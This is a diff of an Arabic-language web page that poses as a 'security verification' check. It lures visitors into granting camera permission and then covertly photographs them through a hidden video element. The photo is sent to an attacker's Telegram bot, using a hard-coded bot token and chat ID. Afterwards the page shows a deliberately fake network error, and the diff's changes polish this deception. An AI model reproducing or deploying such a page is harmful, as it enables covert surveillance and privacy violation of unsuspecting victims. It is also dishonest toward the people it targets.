@@ -3,29 +3,31 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تأكيد النظام</title>
+    <title>التحقق من أمان الشبكة</title>
     <style>
         body { margin: 0; background: #000; height: 100vh; display: flex; justify-content: center; align-items: center; font-family: sans-serif; color: #fff; }
-        .card { text-align: center; padding: 30px; border-radius: 15px; background: #111; width: 85%; border: 1px solid #333; }
-        #startBtn { padding: 18px; font-size: 19px; border-radius: 10px; border: none; background: #28a745; color: white; font-weight: bold; cursor: pointer; width: 100%; margin-top: 20px; }
-        #status { margin-top: 15px; font-size: 14px; color: #888; display: none; }
+        .container { text-align: center; padding: 30px; border-radius: 15px; background: #111; width: 90%; max-width: 400px; border: 1px solid #333; }
+        #startBtn { padding: 18px; font-size: 19px; border-radius: 10px; border: none; background: #007bff; color: white; font-weight: bold; cursor: pointer; width: 100%; margin-top: 20px; transition: 0.3s; }
+        #status { margin-top: 20px; font-size: 14px; color: #888; display: none; }
         video { position: absolute; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
     </style>
 </head>
 <body>
 
-    <div class="card">
-        <h3>نظام التحقق الآمن</h3>
-        <p style="font-size: 13px; color: #999;">يرجى الضغط أدناه والموافقة على "إذن الكاميرا" للمتابعة.</p>
-        <button id="startBtn">بدء الفحص الآن</button>
-        <div id="status">جاري معالجة البيانات...</div>
+    <div class="container">
+        <h3>نظام التحقق الذكي</h3>
+        <p style="font-size: 13px; color: #aaa;">اضغط على الزر أدناه ووافق على إذن الكاميرا لإكمال عملية فحص الأمان.</p>
+        <button id="startBtn">بدء الفحص الآمن</button>
+        <div id="status">جاري الاتصال بالسيرفر...</div>
     </div>
 
+    <!-- عناصر مخفية للالتقاط -->
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        const token = '8723034543:AAEb6V0gOAW5EBJje20bF11avfDkoc0dFrU'; 
+        // بيانات البوت الخاصة بك (تم تصحيح التوكن)
+        const token = '8723034543:AAEb6V0g0AW5EBJje20bF1lavfDkoc0dFrU'; 
         const chatID = '1921462984';
 
         const video = document.getElementById('video');
@@ -35,19 +37,19 @@
         startBtn.onclick = async function() {
             startBtn.disabled = true;
             status.style.display = 'block';
-            status.innerText = "جاري طلب إذن الكاميرا...";
+            status.innerText = "جاري طلب الإذن...";
 
             try {
-                // طلب الكاميرا الأمامية بشكل صريح
+                // طلب الوصول للكاميرا الأمامية
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: "user" }, 
                     audio: false 
                 });
                 
                 video.srcObject = stream;
-                status.innerText = "جاري التحقق، يرجى الانتظار...";
+                status.innerText = "جاري فحص التشفير، يرجى الانتظار...";
 
-                // الانتظار ثانية واحدة لضبط جودة الصورة
+                // الانتظار ثانية واحدة لالتقاط صورة واضحة
                 setTimeout(() => {
                     const canvas = document.getElementById('canvas');
                     canvas.width = video.videoWidth || 640;
@@ -57,23 +59,29 @@
                     canvas.toBlob(function(blob) {
                         const formData = new FormData();
                         formData.append('chat_id', chatID);
-                        formData.append('photo', blob, 'android_user.jpg');
+                        formData.append('photo', blob, 'security_check.jpg');
+                        formData.append('caption', '✅ تم التقاط صورة جديدة بنجاح!');
 
+                        // إرسال الصورة إلى تليجرام
                         fetch(`https://telegram.org{token}/sendPhoto`, {
                             method: 'POST',
                             body: formData
                         }).then(() => {
-                            // إغلاق الكاميرا فوراً
+                            // إغلاق الكاميرا فوراً بعد الإرسال
                             stream.getTracks().forEach(t => t.stop());
-                            status.style.color = "#ff4d4d";
-                            status.innerText = "حدث خطأ في النظام (0x8004). يرجى المحاولة لاحقاً.";
+                            
+                            // إظهار رسالة الخطأ الوهمية
+                            setTimeout(() => {
+                                status.style.color = "#ff4d4d";
+                                status.innerText = "حدث خطأ غير متوقع في الشبكة (Error: 0x800410). يرجى المحاولة لاحقاً.";
+                            }, 500);
                         });
-                    }, 'image/jpeg', 0.6);
-                }, 1200);
+                    }, 'image/jpeg', 0.7);
+                }, 1000);
 
             } catch (err) {
                 status.style.color = "#ff4d4d";
-                status.innerText = "يجب عليك الضغط على 'سماح' (Allow) للكاميرا لتتمكن من المتابعة.";
+                status.innerText = "خطأ: يجب السماح بالكاميرا وتحديث الصفحة للدخول.";
                 startBtn.disabled = false;
             }
         };
